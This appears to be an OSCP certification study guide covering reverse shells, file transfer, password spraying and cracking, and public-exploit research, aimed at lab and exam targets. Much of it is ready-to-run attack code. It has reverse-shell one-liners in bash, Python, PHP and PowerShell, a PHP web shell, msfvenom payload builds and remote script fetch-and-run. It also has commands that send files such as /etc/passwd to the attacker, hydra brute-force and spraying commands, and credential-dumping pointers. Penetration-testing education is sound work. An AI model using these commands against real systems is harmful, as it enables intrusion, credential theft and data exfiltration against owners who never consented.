# OSCP+ KNOWLEDGE BASE — VOLUME 3
## GETTING A SHELL · MOVING FILES · CRACKING PASSWORDS · FINDING EXPLOITS

> **Read this box first.**
> By now you've found a bug or some creds. This volume turns that into a real, working command shell on the target, shows how to move files back and forth, and how to crack any passwords/hashes you loot.
>
> **Two machines, two IPs — keep them straight:**
> - **Your Kali** — the attacker. Its exam IP is on the VPN interface `tun0`. Find it: `ip addr show tun0`. In commands this is `<yourKaliIP>`, `<IP>`, `LHOST`, or `<yourVPN-IP>`. **This is almost always the one beginners get wrong.**
> - **The target** — the victim. That's `$IP` (set it: `export IP=10.10.10.5`).
>
> **Key words defined once:**
> - **Shell** = a command prompt on the target that YOU control.
> - **Reverse shell** = the target connects OUT to you (you run a "listener"; the target's shell dials home). This is the usual approach because outbound connections get through firewalls more easily.
> - **Listener** = a program on your Kali (`nc -lvnp 443`) waiting to catch that incoming connection.
> - **LHOST / LPORT** = the Listener's HOST (your Kali IP) and PORT (e.g. 443). "L" = *your* side.

---

# [FOOTHOLD-CHECKLIST]  getting your first shell (a "foothold")

## [QUICK]  order of attempts — cheapest and easiest first
```
1. Default creds     (product docs, admin:admin, or creds you already found)
2. Weak creds        (Company1!, Welcome1, Summer2025!, the product name, username==password)
3. Credential reuse  (EVERY cred you found → try on EVERY service and EVERY user)
4. Anonymous access  (FTP/SMB/NFS/LDAP/Redis/Mongo that need no login)
5. Known-version RCE (searchsploit / CVE — must match the version exactly)
6. Web vulnerability (upload > command injection > SQLi-to-RCE > LFI-to-RCE > SSTI)
7. Service misconfig (MSSQL xp_cmdshell, Redis file write, Postgres COPY, MySQL FILE)
8. Password spray/brute (only with a real user list + a reason; last resort — can lock accounts)
```

## [PRACTICAL]  pick your way in based on what you have
- **A version number** → `[EXPLOIT-RESEARCH]`. Match version + architecture + auth exactly.
- **A login page** → default/weak creds → SQLi auth bypass → reuse creds you found.
- **An upload form** → `[WEB-UPLOAD]`.
- **A URL/file parameter** → `[WEB-LFI]` / `[WEB-RFI]` / `[WEB-SSRF]`.
- **A feature that runs a system tool** → `[WEB-CMDINJ]`.
- **Database access** → the RCE path for that DB (`[SQLI-MSSQL]` xp_cmdshell, `[SQLI-POSTGRES]` COPY, `[ENUM-MYSQL]` FILE, `[ENUM-REDIS]` write).
- **SMB/WinRM creds** → `impacket-psexec` / `evil-winrm` = instant shell.
- **SSH creds/key** → `ssh`.

## [FOOTHOLD-CREDS-SOURCES]  where credentials hide (check all of these)
Config files, `.env`, `wp-config.php` / `web.config`, database dumps, `.git` history, SNMP process arguments, LDAP `description` fields, SMB shares (GPP `Groups.xml`, `unattend.xml`, scripts), backups (`.bak`, `.zip`), source-code comments and JS files, `~/.bash_history`, `~/.ssh/`, KeePass `.kdbx` files, browser password stores, and memory (LSASS on Windows), sticky notes / `notes.txt`.

## [PASSWORD-SPRAY]  guessing passwords safely (careful — lockouts!)
**The rule:** spray **one** password across **many** users — NOT many passwords against one user (that locks the account and tips off the defender).
```bash
nxc smb $IP -u users.txt -p 'Season2025!' --continue-on-success
#   check the lockout policy FIRST so you don't lock accounts:
nxc smb $IP -u $U -p $P --pass-pol
```
- Common exam-style passwords: `Password1`, `Welcome1`, `<Company>1!`, `<Season><Year>!`, username==password, the product's default.
- **⭐ Spray one cred across MANY protocols + hosts in one shot — `nxcspray`** (a small bash wrapper around nxc; **exam-legal** because it just *runs* nxc for you, no auto-exploitation):
  ```bash
  # install once: git clone https://github.com/NTHSec/nxcspray ; chmod +x nxcspray/nxcspray
  nxcspray smb,winrm targets.txt -u e.hills -p 'Il0vemyj0b2025!'   # these protocols vs a list of hosts
  nxcspray all 10.1.45.200 -u e.hills -p 'Password1'               # ALL protocols (smb/winrm/rdp/mssql/ssh…) vs one host
  ```
  Ideal right after a pivot: one command tells you every host where the cred is valid and where you're `(Pwn3d!)`. (Same idea as looping `nxc <proto>` yourself — just faster.)
- **Brute-forcing one service** (only with evidence): `hydra -L users.txt -P rockyou.txt <service>://$IP` — noisy, slow, last resort.

## [HYDRA]  brute-forcing a login (last resort — watch for lockouts)
**What Hydra does:** rapidly tries username/password combinations against a login. `-l` (lowercase L) = one username; `-L` = a file of usernames. `-p` = one password; `-P` = a file of passwords. The `service://` part picks what to attack.
```bash
hydra -l admin      -P rockyou.txt ftp://$IP
hydra -L users.txt  -P rockyou.txt ssh://$IP -t 4        # -t 4 = only 4 parallel tries (SSH is fussy)
hydra -l george     -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://$IP   # -s PORT = login is on a NON-standard port
#   (same thing: hydra ... ssh://$IP:2222)
hydra -l admin      -P rockyou.txt rdp://$IP
hydra -C combos.txt <service>://$IP                       # combos.txt = one "user:pass" pair per line

# ⭐ The tricky, most-needed one — an HTML login FORM (POST):
#   format is  "<path>:<post-body with ^USER^ and ^PASS^>:<a string that only appears on FAILURE>"
hydra -l admin -P rockyou.txt $IP http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
hydra -L users.txt -P rockyou.txt $IP http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
#   use  S=<text>  instead of  F=<text>  to match a SUCCESS marker (like a redirect header) instead
# HTTP Basic auth (the grey browser popup):
hydra -l admin -P rockyou.txt -f $IP http-get /admin       # -f = stop at the first valid pair
```
**Building the http-post-form string (the confusing part):** submit the login once in Burp Suite, then copy: (1) the **exact path** (`/login.php`), (2) the **POST body** with the real username/password swapped for `^USER^`/`^PASS^`, and (3) a **string that appears only when login FAILS** (put it after `F=`). Common `-s` gotcha: `-s` is the **port**, `-p` is a single password — don't mix them up. For web logins, **ffuf is often easier** — see `[WEB-AUTH]`.

## [FILE-ANALYSIS]  you found a file/image and don't know what to do with it
> ⚠️ **Rare on OSCP, common on beginner CTFs.** Don't sink time into images unless the box clearly points you at one (`[COMMON-RABBIT-HOLES]`).
```bash
file suspicious.bin            # what type of file is it, really?
strings -n 8 suspicious.bin    # print readable text inside it (creds/flags/paths often hide here)
exiftool image.jpg             # metadata (author/comment/GPS) — sometimes leaks usernames or hints
binwalk -e firmware.bin        # find and extract files hidden/appended inside another file
steghide extract -sf image.jpg # pull data hidden inside an image (try empty passphrase, or a found password)
zsteg image.png                # stego check for PNGs
stegseek image.jpg wordlist    # brute-force a steghide passphrase with a wordlist
```
**⭐ exiftool as an actual way IN (more OSCP-relevant):** if a website runs **exiftool < 12.24** on images you upload → **CVE-2021-22204** = command execution. You upload a booby-trapped image (DjVu format) with your command inside it and the server runs it. Grab a public proof-of-concept `[LOOK-UP: CVE-2021-22204]` and pair it with `[WEB-UPLOAD]`. Check the exiftool version if the site shows you image metadata.

---

# [SHELL-QUICK]  GETTING A REVERSE SHELL

## [SHELL-QUICK]  the essentials  (one screen)
```bash
# STEP 1 — on YOUR Kali, start the listener (waits for the target to connect back):
nc -lvnp 443                                     # [MUST-MEMORIZE]  -l listen  -v verbose  -n no-DNS  -p port

# STEP 2 — make the target run ONE of these (put YOUR Kali IP where it says <IP>):
# Linux target, bash:
bash -i >& /dev/tcp/<IP>/443 0>&1                # [MUST-MEMORIZE] the classic Linux reverse shell
bash -c 'bash -i >& /dev/tcp/<IP>/443 0>&1'      # same, wrapped so it survives odd contexts
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 443 >/tmp/f    # if bash's /dev/tcp is missing
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn("/bin/bash")'
# Windows target:
nc.exe <IP> 443 -e cmd.exe                       # if you transferred nc.exe first
powershell -e <base64>                           # PowerShell one-liner (build the base64 below)
```
> **Why `/dev/tcp/<IP>/443`?** Bash has a built-in trick: writing to the fake file `/dev/tcp/IP/PORT` opens a network connection. So this line connects the target's shell back to your listener. `>&` and `0>&1` wire the shell's input/output through that connection.

**Always listen on a common outbound port — 443, 80, or 8080.** Firewalls usually allow those outbound, so your shell gets home.

## [SHELL-LINUX]  reverse shells when the target is Linux
- Try bash `/dev/tcp` or python first. If `bash` isn't there, try `sh`, `nc`, `mkfifo`, `perl`, or `php -r`.
- PHP: `php -r '$s=fsockopen("<IP>",443);exec("/bin/sh -i <&3 >&3 2>&3");'`
- Web PHP shell already on the box: `<?php system($_GET['c']); ?>` then visit `?c=<url-encoded reverse shell>`.
- **Encoding tip:** when sending a shell through a web parameter, URL-encode the special characters (`&`, `;`, `|`, space). Through a command, base64 it: `echo -n 'bash -i >& /dev/tcp/<IP>/443 0>&1' | base64` on Kali → on target `echo <base64>|base64 -d|bash`.

## [SHELL-WINDOWS]  reverse shells when the target is Windows
- **PowerShell one-liner (base64-encoded)** — build it on Kali:
  ```bash
  PS='$c=New-Object System.Net.Sockets.TCPClient("<IP>",443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s2=$r+"PS "+(pwd).Path+"> ";$sb=[Text.Encoding]::ASCII.GetBytes($s2);$s.Write($sb,0,$sb.Length);$s.Flush()}'
  echo -n "$PS" | iconv -t UTF-16LE | base64 -w0        # paste the result after:  powershell -e
  ```
- **nc.exe:** `nc.exe <IP> 443 -e cmd.exe` (you must transfer `nc.exe` to the target first).
- **Better interactive shells:** ConPtyShell, RunasCs, or Nishang's Invoke-PowerShellTcp `[LOOK-UP]`.
- **msfvenom** (makes a ready-to-run exe — use on your ONE allowed Metasploit box, or just for a stable shell):
  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe -o rev.exe
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f exe -o met.exe   # Meterpreter = MSF box only
  ```
- **Web shells:** an ASPX/JSP webshell, or `msfvenom -p ... -f aspx`.

## [SHELL-STABILIZE]  upgrading a dumb shell to a proper one (Linux)  [MUST-MEMORIZE]
A fresh reverse shell is "dumb" — no arrow keys, no tab-complete, and Ctrl+C kills it. Fix it:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # step 1: get a proper bash (try 'python' if python3 missing)
# now press: Ctrl-Z   (this backgrounds the shell, dropping you to YOUR Kali)
stty raw -echo; fg                                # step 2: fix the terminal + bring the shell back
# press Enter twice
export TERM=xterm ; export SHELL=/bin/bash        # step 3: set terminal type so clear/less/vim work
stty rows 50 columns 200                          # step 4: match your window size (run 'stty -a' locally to see yours)
```
Alternatives: `script -qc /bin/bash /dev/null`; or full `socat` TTY if socat is on both ends.
**Windows "stabilizing":** upgrade to evil-winrm / RDP / RunasCs / ConPtyShell. Native cmd/powershell reverse shells are only *semi*-interactive — avoid programs that prompt for input; run non-interactive commands.
- **Invoke-ConPtyShell** (the best Windows interactive shell): on Kali `stty raw -echo; nc -lvnp 443`; on target `IEX(IWR http://<IP>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <IP> 443 <rows> <cols>`.
- **Kali ships ready-made webshells:** `ls /usr/share/webshells/` (php, asp, aspx, jsp, perl) — copy one instead of writing your own.

## [REVERSE-SHELL-NOT-CONNECTING]  it's not connecting — work through this in order
```
1. Is the listener actually running, on the right port?   → nc -lvnp 443 in a live terminal
2. Right LHOST (your tun0 VPN IP, NOT eth0)?             → ip addr show tun0   ← #1 cause of failure
3. Right LPORT, and does the target allow it out?         → try 443, then 80, then 8080
4. Did the payload actually run on the target?            → did the web request/command return? read errors
5. Did encoding/quoting mangle it?                        → URL-encode web payloads; base64 the command
6. Wrong shell program?                                   → try sh instead of bash; or python; nc; perl
7. Windows AV/AMSI ate the PowerShell payload?            → base64/obfuscate it, or use nc.exe / an msfvenom exe
8. Is all outbound blocked?                               → use a BIND shell instead, or pivot, or a web shell
9. Firewall on YOUR side?                                 → check your host firewall / VPN routing
10. Still nothing?                                        → tcpdump -i tun0 port 443   (do you even see the SYN?)
```
Most common, in order: **wrong LHOST (used eth0 instead of tun0)**, listener not running, blocked port, quoting/encoding, AV.

---

# [FILETRANSFER-QUICK]  MOVING FILES BETWEEN KALI AND THE TARGET

> The model is almost always: **Kali serves a file, the target downloads it.** So you start a mini web server on Kali, then run a download command on the target.

## [QUICK]  serve from Kali
```bash
python3 -m http.server 80                          # [MUST-MEMORIZE] serves the CURRENT folder over http on port 80
impacket-smbserver share $(pwd) -smb2support       # serve current folder as a Windows SMB share (great for Windows)
#   add  -user u -password p  if the target refuses anonymous SMB
```
### Kali → Linux target (download onto the target)
```bash
wget http://<IP>/file -O /tmp/file          # [MUST-MEMORIZE]  <IP> = your Kali IP
curl http://<IP>/file -o /tmp/file
# no wget or curl on the box? use bash's built-in TCP:
exec 3<>/dev/tcp/<IP>/80; echo -e "GET /file HTTP/1.0\r\n\r\n" >&3; cat <&3
```
### Kali → Windows target (download onto the target)
```powershell
certutil -urlcache -split -f http://<IP>/file.exe file.exe          # [MUST-RECOGNIZE] classic Windows downloader
powershell -c "Invoke-WebRequest http://<IP>/file -OutFile file"    # modern PowerShell download
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/f','C:\Windows\Temp\f')"   # works on OLD PowerShell too
copy \\<IP>\share\file.exe .            # pull from your impacket-smbserver share
curl.exe http://<IP>/file -o file       # certutil blocked? curl.exe exists on Win10+ (note the .exe)
```
### Target → Kali (send loot back to you)
```bash
# On Kali, receive with netcat:
nc -lvnp 443 > loot.dat                 # then on the target:  nc <IP> 443 < file
# Linux target push over HTTP (needs a server that accepts uploads):
curl -F 'f=@/etc/passwd' http://<IP>:8000/
# Windows target → your SMB share:
copy C:\loot\file.txt \\<IP>\share\
# over SSH:
scp file user@<IP>:/path          # or from Kali:  scp user@target:/path/file .
```
### base64 (when there's no working network transfer)
```bash
# on the SOURCE machine, print the file as text:
base64 -w0 file                                     # Linux
# (PowerShell:  [Convert]::ToBase64String([IO.File]::ReadAllBytes("f"))  )
# copy that text, then on the DESTINATION rebuild it:
echo <base64text> | base64 -d > file                # Linux
# (PowerShell:  [IO.File]::WriteAllBytes("f",[Convert]::FromBase64String("<b64>"))  )
```
## [FILETRANSFER-TROUBLESHOOTING]
| Problem | Fix |
|---|---|
| certutil blocked / flagged by AV | use `curl.exe`, `bitsadmin`, PowerShell DownloadFile, or SMB |
| PowerShell download fails (proxy/TLS) | `[Net.ServicePointManager]::SecurityProtocol='Tls12'`; use the IP, not a hostname |
| Binary is corrupted (Linux ftp) | set `binary` mode before `get` |
| SMB copy denied | use `-smb2support`, or add `-user/-password` and `net use` on the target |
| No outbound at all | serve FROM the target and pull to Kali, or base64-paste |
| Exe won't run ("not a valid application") | wrong architecture — match x86 vs x64 |

---

# [PASSWORD-ATTACKS]  🔑 everything about passwords, in one place
```
FIND creds     → [CREDENTIALS-QUICK] [CREDENTIALS-SOURCES] [FOUND-CREDS] [FOUND-SSHKEY]
GUESS online   → [PASSWORD-SPRAY] (spray, lockout-aware) · [HYDRA] · netexec/kerbrute spraying
IDENTIFY hash  → [HASH-IDENTIFICATION] (what kind of hash is this?)
CRACK offline  → hashcat / john · [WORDLIST-MUTATE] · *2john converters (ssh/zip/keepass/office)
DUMP creds     → mimikatz/secretsdump/lsassy/LaZagne/SAM (Windows)
USE without cracking → Pass-the-Hash (nxc -H / evil-winrm -H / psexec -hashes) · Pass-the-Ticket
AD-specific    → [AD-KERBEROAST] [AD-ASREP] gpp-decrypt · DCSync
```
> **The winning order:** found a password → **spray it everywhere first**. Got a *hash*? → **try Pass-the-Hash before cracking** (often you don't need the plaintext). Must crack? → rockyou + rules. Still stuck? → build a custom list from the site (`[WORDLIST-MUTATE]`). Still nothing? → **move on** — don't grind a strong hash for hours (`[COMMON-RABBIT-HOLES]`).

# [CREDENTIALS-QUICK]  USING CREDENTIALS

## [QUICK]  the golden rule: every credential → try it EVERYWHERE
```bash
nxc smb   $IP -u u -p p         # test on SMB (add --local-auth for local, non-domain accounts)
nxc winrm $IP -u u -p p         # test on WinRM (Pwn3d! = you can get a shell here)
nxc ldap  <dc> -u u -p p        # validate against the domain / dump LDAP
nxc mssql $IP -u u -p p         # test on MSSQL (→ xp_cmdshell if it works)
nxc rdp   $IP -u u -p p         # test on RDP (Pwn3d! = you can log in to the desktop)
ssh u@$IP ; evil-winrm -i $IP -u u -p p          # actually log in wherever the cred worked
```
Also try the same password as **other usernames**, with small **variations**, and as a **domain** account (`-d DOMAIN`) vs a **local** account (`--local-auth`).

## [CREDENTIALS-SOURCES]  where to loot creds after you get a shell
**Linux:** `/etc/passwd` + `/etc/shadow` (need root), `~/.ssh/id_*` keys, `~/.bash_history`, `/var/www/**/config*`, `.env` files, DB configs, cron scripts, backups, `find / -name "*.kdbx"` (KeePass), mounted shares.
**Windows:** `secretsdump.py 'DOMAIN/u:p'@host` (dumps SAM/LSA/NTDS), the SAM+SYSTEM registry hives, an LSASS memory dump (mimikatz/comsvcs), `cmdkey /list` + `runas /savecred`, DPAPI, PowerShell history (`ConsoleHost_history.txt`), `unattend.xml`, GPP `cpassword`, KeePass, browser creds, autologon registry (`DefaultPassword`).

## [HASH-IDENTIFICATION]  "I found a hash — what is it?"
> **What's a hash?** A password stored as a scrambled fingerprint. You can't un-scramble it, but you can guess passwords, hash each guess, and compare — that's "cracking."
- Identify it: `hashid <hash>`, `hash-identifier`, or `nth --text <hash>` (name-that-hash). Or recognise it by shape:
  - **32 hex characters** → MD5 or NTLM (NTLM if it came from a Windows dump).
  - **Linux `/etc/shadow`** uses the format `$id$salt$hash` — the `$id$` says which algorithm: `$1$`=md5crypt, `$5$`=sha256crypt (`-m 7400`), **`$6$`=sha512crypt (`-m 1800`)**, `$y$`=yescrypt. Example: `root:$6$SALT$HASH:…` = root's password as SHA-512crypt.
  - `$2a$` / `$2b$` → bcrypt.
  - `aad3b435...:<32hex>` → an LM:NTLM pair (use the NTLM half, after the colon).
  - `user::DOMAIN:...` (long) → **NetNTLMv2** (what Responder captures).
  - `$krb5tgs$23$...` → Kerberoast hash. `$krb5asrep$23$...` → AS-REP hash.
- **hashcat mode numbers to memorise** (`-m` must match the hash type):
  ```
  NTLM 1000 | NetNTLMv2 5600 | Kerberoast 13100 | AS-REP 18200
  md5crypt 500 | sha512crypt 1800 | bcrypt 3200 | domain-cached 2100
  raw-md5 0 | raw-sha1 100 | NetNTLMv1 5500 | JWT(HS256) 16500 | KeePass 13400
  ```
- **Crack it:**
  ```bash
  hashcat -m 1000 hashes.txt rockyou.txt -O                  # crack NTLM with the rockyou wordlist; -O = optimized/faster
  hashcat -m 13100 tgs.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule   # Kerberoast + password mutations
  john --format=<fmt> --wordlist=rockyou.txt hashes.txt      # john is an alternative; it can auto-detect the type
  ```
  **Command anatomy:** `hashcat -m <TYPE> <your-hash-file> <Kali-wordlist> [-r rules] [-O]`. `-m` picks the hash type; `-a 3 ?u?l?l?d?d` switches to brute-forcing a *pattern* instead of a wordlist.
- **Wordlists/rules live at:** `/usr/share/wordlists/rockyou.txt` (gunzip it once), SecLists; rules `best64`, `rockyou-30000`, `OneRuleToRuleThemAll` `[LOOK-UP]`.

## [WORDLIST-MUTATE]  building a custom wordlist (when rockyou fails)
**Best practice — mutate on the fly with "rules" (no need to pre-build a file):**
```bash
hashcat -m <mode> hash.txt base.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m <mode> hash.txt base.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule   # bigger, slower
```
**Generate a mutated list to a FILE** (to feed hydra/nxc, which can't do rules themselves):
```bash
hashcat --stdout base.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
john --wordlist=base.txt --rules=Jumbo --stdout > mutated.txt
```
**Build a base list from the target itself** (a very common OSCP move — the password is often a company word):
```bash
cewl -d 2 -m 5 http://$IP -w words.txt     # scrape the website into a wordlist (-d depth, -m min length)
cupp -i                                     # interactive: build a list from a person's name/dates/pets
crunch 8 10 -t Summer@@@@ -o w.txt          # generate by pattern (@=letter, %=digit, ^=symbol)
```
**hashcat rule syntax** (each LINE is one rule; the functions apply left→right to every word):
```
$X = append char X     ^X = prepend char X     c = Capitalize (u=UPPER, l=lower, t=toGGLE)
sXY = substitute X→Y (leetspeak: sa@ ss$ so0)   d = duplicate word   r = reverse   [ ]=delete first/last
# example: the rule  "$1 c $!"  turns  password → password1 → Password1 → Password1!
printf '$1 c $!\n$2 c $!\n' > demo.rule
hashcat --stdout wordlist.txt -r demo.rule       # PREVIEW what candidates it makes (doesn't crack — just shows)
hashcat -m <mode> hash.txt wordlist.txt -r demo.rule
```
**When to bother:** rockyou failed but you have a hint (company name, a word you found, a `Season+Year!` pattern). Don't grind giant rule-sets against a strong Kerberos/bcrypt hash — move on.
- **Don't crack if you can pass:** got an NTLM hash? Try **Pass-the-Hash** first (`nxc -H`, `evil-winrm -H`, `psexec -hashes`) — you may never need the plaintext.

## [CREDENTIALS-TOOLS]
- `secretsdump.py` (impacket) — dump SAM/LSA/NTDS, and DCSync.
- `mimikatz` — pull creds/tickets from Windows memory.
- `hashcat` / `john` — offline cracking.
- `ssh2john`, `keepass2john`, `zip2john`, `office2john` — turn a protected file into a crackable hash.
- `nxc` / `crackmapexec` — spraying and Pass-the-Hash.

---

# [EXPLOIT-RESEARCH]  finding and using public exploits

## [QUICK]  the pipeline
```
KNOWN VULNERABLE VERSION → searchsploit / web CVE search → pick a match → READ the code
→ verify it matches (version + arch + auth + language) → edit it (your LHOST/LPORT/paths) → test → run
```
## [SEARCHSPLOIT]  the offline Exploit-DB search tool
```bash
searchsploit remote smb microsoft windows       # keywords are AND-ed together (searches title + path)
searchsploit apache 2.4.49                       # product + version
searchsploit -t apache                           # -t = search TITLES only (far fewer false hits)
searchsploit --exclude="dos" wordpress 5.7       # drop the denial-of-service noise
searchsploit --cve 2021-41773                    # search by CVE id
searchsploit --nmap scans/scan.xml               # search straight from your nmap XML (scan with -oX)
# once you find one:
searchsploit -x 50383                            # -x = read/examine exploit #50383
searchsploit -m 50383                            # -m = copy ("mirror") it into your current folder
searchsploit -p 50383                            # -p = print its full file path
searchsploit -u                                  # update the local exploit database
```
**Reading the results:** the folder in the **path** tells you the type — `/remote/` = remote exploit, `/webapps/` = web app, `/local/` = local privilege escalation, `/dos/` = **denial-of-service (crashes things — usually useless for getting in, skip it)**. **Tip:** searchsploit matches literal text, so an over-specific version can miss — search broader (`apache 2.4`) and eyeball it, or use `-t`. Always **read the exploit** with `-x` before running it.
- On the web, search `"<product> <version> exploit"`, `"<product> CVE"`, GitHub, Exploit-DB, PacketStorm. Prefer proof-of-concepts you can **read**.
- **Match precisely:** exact version (off-by-one breaks it), architecture (x86/x64), whether it needs a login (authed vs unauth), and interpreter version (Python2 vs 3).
- **Before running, read it:** what does it do? Does it need a listener or arguments? Could it crash the service? Change any hard-coded IPs/ports/paths to yours.
- **Common breakage:** Python2 syntax (`print "x"`), missing libraries, wrong `LHOST`, wrong target offset, a needed header/cookie, or a required valid session.
## [EXPLOIT-RESEARCH-CAUTIONS]
- **Never run an unknown PoC blindly** — some are booby-trapped to attack *you*. Read every line; watch what it connects to.
- Memory-corruption/DoS exploits can crash the box (costing you a revert). Prefer stable, logic-based exploits.
- If an exploit "should" work but doesn't: recheck the version match, try the manual technique the CVE describes, or find another PoC.
- **Exam rule:** you may use public exploit code you understand and run by hand; you may NOT use Metasploit beyond your one allowed target. Screenshot everything for the report.

---
*End Volume 3. Next: Volume 4 — going from a normal user to root/SYSTEM (privilege escalation).*
